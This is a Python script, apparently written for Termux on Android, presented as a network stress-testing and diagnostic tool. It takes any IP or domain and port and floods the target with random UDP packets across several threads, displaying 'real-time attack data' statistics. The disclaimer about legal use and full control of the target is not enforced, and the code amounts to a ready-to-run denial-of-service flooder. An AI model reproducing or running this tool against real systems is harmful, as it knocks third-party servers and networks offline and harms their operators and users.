#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import random
import threading
import queue
import json
from datetime import datetime
import subprocess

# Termux环境检测和适配
IS_TERMUX = os.path.exists('/data/data/com.termux')
IS_ANDROID = os.path.exists('/system/bin/app_process')

# 彩色输出 - Termux兼容版本
class Colors:
    RED = '\033[91m' if not IS_ANDROID else '\033[31m'
    GREEN = '\033[92m' if not IS_ANDROID else '\033[32m'
    YELLOW = '\033[93m' if not IS_ANDROID else '\033[33m'
    BLUE = '\033[94m' if not IS_ANDROID else '\033[34m'
    PURPLE = '\033[95m' if not IS_ANDROID else '\033[35m'
    CYAN = '\033[96m' if not IS_ANDROID else '\033[36m'
    WHITE = '\033[97m' if not IS_ANDROID else '\033[37m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    END = '\033[0m'

def clear_screen():
    """清屏 - Termux兼容"""
    if IS_TERMUX:
        os.system('clear')
    else:
        os.system('cls' if os.name == 'nt' else 'clear')

def check_termux_permissions():
    """检查Termux权限"""
    if IS_TERMUX:
        try:
            # 检查是否有网络权限
            result = subprocess.run(['termux-info'], capture_output=True, text=True, timeout=5)
            if 'net' not in result.stdout:
                print(f"{Colors.YELLOW}[!] 警告: Termux可能没有网络权限{Colors.END}")
                print(f"{Colors.CYAN}[*] 请在Termux中运行: termux-setup-storage{Colors.END}")
                return False
        except:
            pass
    return True

def resolve_domain(domain):
    """域名解析"""
    try:
        # 移除协议前缀
        domain = domain.replace('http://', '').replace('https://', '').replace('/', '')
        
        # 检查是否是IP地址
        try:
            socket.inet_aton(domain)
            return domain, "IP"
        except socket.error:
            pass
        
        # 域名解析
        ip = socket.gethostbyname(domain)
        return ip, "DOMAIN"
    except socket.gaierror:
        return None, "FAILED"

def validate_ip(ip):
    """验证IP地址格式"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    """验证端口范围"""
    return 1 <= port <= 65535

def get_network_interface():
    """获取网络接口信息 - Termux适配"""
    try:
        if IS_TERMUX:
            # Termux环境下获取网络信息
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        return line.strip()
        return "Unknown"
    except:
        return "Unknown"

class RealTimeStats:
    """实时统计类"""
    def __init__(self):
        self.start_time = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        self.success_packets = 0
        self.failed_packets = 0
        self.current_speed = 0
        self.peak_speed = 0
        self.lock = threading.Lock()
        
    def update(self, packets=0, bytes_sent=0, success=True):
        """更新统计信息"""
        with self.lock:
            self.total_packets += packets
            self.total_bytes += bytes_sent
            if success:
                self.success_packets += packets
            else:
                self.failed_packets += packets
            
            # 计算当前速度
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.current_speed = self.total_packets / elapsed
                self.peak_speed = max(self.peak_speed, self.current_speed)
    
    def get_stats(self):
        """获取当前统计"""
        with self.lock:
            elapsed = time.time() - self.start_time
            return {
                'total_packets': self.total_packets,
                'total_bytes': self.total_bytes,
                'success_packets': self.success_packets,
                'failed_packets': self.failed_packets,
                'current_speed': self.current_speed,
                'peak_speed': self.peak_speed,
                'elapsed_time': elapsed,
                'success_rate': (self.success_packets / self.total_packets * 100) if self.total_packets > 0 else 0
            }

class NetworkTester:
    """网络测试工具类"""
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.target_type = None  # IP或DOMAIN
        self.original_target = None
        self.threads = 5  # Termux默认使用较少线程
        self.packet_size = 1024  # Termux优化的小数据包
        self.duration = 0
        self.running = False
        self.stats = RealTimeStats()
        self.display_queue = queue.Queue()
        
    def get_user_input(self):
        """获取用户输入 - Termux优化版本"""
        clear_screen()
        
        # Termux专用banner
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════╗
║                Termux 网络压力测试工具                     ║
║                      v2.0 安卓优化版                      ║
╚════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
        
        # 显示系统信息
        print(f"{Colors.CYAN}[*] 系统信息:{Colors.END}")
        print(f"    设备: {'Android ' + os.popen('getprop ro.build.version.release').read().strip() if IS_ANDROID else 'Unknown'}")
        print(f"    网络: {get_network_interface()}")
        print(f"    Python: {sys.version.split()[0]}")
        print()
        
        print(f"{Colors.YELLOW}[*] 请输入目标信息 (支持IP地址或域名){Colors.END}")
        
        # 获取目标
        while True:
            target = input(f"{Colors.CYAN}[?] 目标 (IP或域名): {Colors.END}").strip()
            if not target:
                continue
                
            self.original_target = target
            ip, target_type = resolve_domain(target)
            
            if ip:
                self.target_ip = ip
                self.target_type = target_type
                print(f"{Colors.GREEN}[✓] 目标解析成功: {target} -> {ip} ({target_type}){Colors.END}")
                break
            else:
                print(f"{Colors.RED}[!] 无法解析目标: {target}{Colors.END}")
        
        # 获取端口
        while True:
            try:
                port = int(input(f"{Colors.CYAN}[?] 端口 (1-65535, 默认80): {Colors.END}").strip() or "80")
                if validate_port(port):
                    self.target_port = port
                    break
                print(f"{Colors.RED}[!] 端口必须在1-65535之间{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[!] 请输入有效的数字{Colors.END}")
        
        # 获取线程数 - Termux优化
        while True:
            try:
                default_threads = 3 if IS_TERMUX else 10
                max_threads = 20 if IS_TERMUX else 100
                threads = int(input(f"{Colors.CYAN}[?] 线程数 (1-{max_threads}, 默认{default_threads}): {Colors.END}").strip() or str(default_threads))
                if 1 <= threads <= max_threads:
                    self.threads = threads
                    break
                print(f"{Colors.RED}[!] 线程数必须在1-{max_threads}之间{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[!] 请输入有效的数字{Colors.END}")
        
        # 获取数据包大小 - Termux优化
        while True:
            try:
                default_size = 512 if IS_TERMUX else 1024
                max_size = 4096 if IS_TERMUX else 64000
                packet_size = int(input(f"{Colors.CYAN}[?] 数据包大小 (64-{max_size}, 默认{default_size}): {Colors.END}").strip() or str(default_size))
                if 64 <= packet_size <= max_size:
                    self.packet_size = packet_size
                    break
                print(f"{Colors.RED}[!] 数据包大小必须在64-{max_size}之间{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[!] 请输入有效的数字{Colors.END}")
        
        # 获取持续时间
        while True:
            try:
                duration = int(input(f"{Colors.CYAN}[?] 持续时间 (秒, 0为手动停止, 默认30): {Colors.END}").strip() or "30")
                self.duration = duration
                break
            except ValueError:
                print(f"{Colors.RED}[!] 请输入有效的数字{Colors.END}")
        
        # 确认信息
        print(f"\n{Colors.YELLOW}[*] 配置确认:{Colors.END}")
        print(f"    目标: {self.original_target} ({self.target_ip}:{self.target_port})")
        print(f"    类型: {self.target_type}")
        print(f"    线程: {self.threads}")
        print(f"    数据包: {self.packet_size} bytes")
        print(f"    持续时间: {'手动' if self.duration == 0 else str(self.duration) + '秒'}")
        
        input(f"\n{Colors.CYAN}[*] 按Enter键开始测试...{Colors.END}")
    
    def display_worker(self):
        """显示工作线程"""
        last_update = time.time()
        
        while self.running or not self.display_queue.empty():
            try:
                # 尝试获取显示更新，但不阻塞
                try:
                    self.display_queue.get_nowait()
                except queue.Empty:
                    pass
                
                current_time = time.time()
                if current_time - last_update >= 0.5:  # 每0.5秒更新一次
                    self.display_stats()
                    last_update = current_time
                    
                time.sleep(0.1)
                
            except KeyboardInterrupt:
                break
    
    def display_stats(self):
        """显示实时统计 - Termux优化"""
        stats = self.stats.get_stats()
        
        # Termux小屏幕优化显示
        display = f"""
{Colors.CLEAR_LINE}{Colors.CYAN}
╔════════════════════════════════════════════════════════════╗
║                    实时攻击数据                            ║
╠════════════════════════════════════════════════════════════╣
║ 目标: {self.original_target[:20]:<20} ({self.target_ip})             ║
║ 端口: {self.target_port:<5} 类型: {self.target_type:<6} 线程: {self.threads:<2}          ║
║                                                            ║
║ 发送包: {stats['total_packets']:<8} 成功: {stats['success_packets']:<8} 失败: {stats['failed_packets']:<8} ║
║ 速率: {stats['current_speed']:.1f}/s 峰值: {stats['peak_speed']:.1f}/s 成功率: {stats['success_rate']:.1f}%   ║
║ 数据量: {(stats['total_bytes']/(1024*1024)):.2f} MB 时间: {stats['elapsed_time']:.1f}s               ║
╚════════════════════════════════════════════════════════════╝
{Colors.END}"""
        
        print(f"\r{display}", end='', flush=True)
    
    def attack_worker(self, worker_id):
        """攻击工作线程 - Termux优化"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            # 准备数据
            packet_data = random._urandom(self.packet_size)
            local_stats = {'sent': 0, 'failed': 0, 'bytes': 0}
            
            while self.running:
                try:
                    # 发送数据包
                    sock.sendto(packet_data, (self.target_ip, self.target_port))
                    local_stats['sent'] += 1
                    local_stats['bytes'] += self.packet_size
                    
                    # 定期更新统计
                    if local_stats['sent'] % 50 == 0:
                        self.stats.update(
                            packets=local_stats['sent'],
                            bytes_sent=local_stats['bytes'],
                            success=True
                        )
                        local_stats = {'sent': 0, 'failed': 0, 'bytes': 0}
                        
                        # 触发显示更新
                        self.display_queue.put(True)
                    
                    # Termux优化: 小延迟避免系统过载
                    time.sleep(0.001)
                    
                except (socket.error, socket.timeout):
                    local_stats['failed'] += 1
                    if local_stats['failed'] % 10 == 0:
                        self.stats.update(
                            packets=local_stats['failed'],
                            bytes_sent=0,
                            success=False
                        )
                        local_stats['failed'] = 0
                        
                except KeyboardInterrupt:
                    break
                    
        except Exception as e:
            print(f"\n{Colors.RED}[!] 线程{worker_id}错误: {e}{Colors.END}")
        finally:
            # 更新剩余统计
            if local_stats['sent'] > 0 or local_stats['failed'] > 0:
                self.stats.update(
                    packets=local_stats['sent'] + local_stats['failed'],
                    bytes_sent=local_stats['bytes'],
                    success=(local_stats['failed'] == 0)
                )
            try:
                sock.close()
            except:
                pass
    
    def timer_worker(self):
        """计时器工作线程"""
        if self.duration > 0:
            time.sleep(self.duration)
            print(f"\n{Colors.YELLOW}[*] 达到设定时间，准备停止...{Colors.END}")
            self.running = False
    
    def start_test(self):
        """开始网络测试"""
        clear_screen()
        
        # 显示启动信息
        print(f"{Colors.GREEN}[*] 启动网络压力测试...{Colors.END}")
        print(f"{Colors.CYAN}[*] 正在初始化 {self.threads} 个工作线程...{Colors.END}")
        
        self.running = True
        threads = []
        
        # 启动显示线程
        display_thread = threading.Thread(target=self.display_worker)
        display_thread.daemon = True
        display_thread.start()
        
        # 启动计时器线程
        if self.duration > 0:
            timer_thread = threading.Thread(target=self.timer_worker)
            timer_thread.daemon = True
            timer_thread.start()
        
        # 启动工作线程
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # 避免同时启动造成系统负载
        
        try:
            # 等待所有线程完成
            for thread in threads:
                thread.join(timeout=0.1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] 用户中断测试{Colors.END}")
            self.running = False
            
        finally:
            self.running = False
            time.sleep(1)  # 等待线程清理
            self.print_final_report()
    
    def print_final_report(self):
        """打印最终报告"""
        stats = self.stats.get_stats()
        
        report = f"""
{Colors.GREEN}
╔════════════════════════════════════════════════════════════╗
║                    测试完成报告                            ║
╠════════════════════════════════════════════════════════════╣
║ 测试目标: {self.original_target} ({self.target_ip}:{self.target_port})            
║ 测试类型: {self.target_type} 压力测试                           
║                                                            ║
║ 总发送数据包: {stats['total_packets']:,}                                      
║ 成功数据包: {stats['success_packets']:,} ({stats['success_rate']:.1f}%)                    
║ 失败数据包: {stats['failed_packets']:,}                                     
║                                                            ║
║ 总数据量: {(stats['total_bytes']/(1024*1024)):.2f} MB                         
║ 平均速率: {stats['current_speed']:.1f} packets/sec                     
║ 峰值速率: {stats['peak_speed']:.1f} packets/sec                        
║ 持续时间: {stats['elapsed_time']:.1f} 秒                                    
╚════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(report)

def main():
    """主函数 - Termux版本"""
    try:
        # 清屏
        clear_screen()
        
        # 检查权限
        if not check_termux_permissions():
            return
        
        # 显示欢迎信息
        welcome = f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════╗
║              Termux 网络诊断工具 v2.0                     ║
║                    安卓5.1+ 优化版                        ║
║                                                            ║
║  ⚠️  本工具仅用于合法的网络测试和诊断                    ║
║  ⚠️  请确保你对目标系统有完全控制权                     ║
╚════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(welcome)
        
        input(f"{Colors.CYAN}[*] 按Enter键继续...{Colors.END}")
        
        # 创建并运行工具
        tool = NetworkTester()
        tool.get_user_input()
        tool.start_test()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] 程序被用户中断{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] 程序错误: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
    finally:
        print(f"{Colors.CYAN}[*] 程序结束，感谢使用{Colors.END}")

if __name__ == "__main__":
    # 添加清行控制符定义
    if not hasattr(Colors, 'CLEAR_LINE'):
        Colors.CLEAR_LINE = '\033[K'
    
    main()
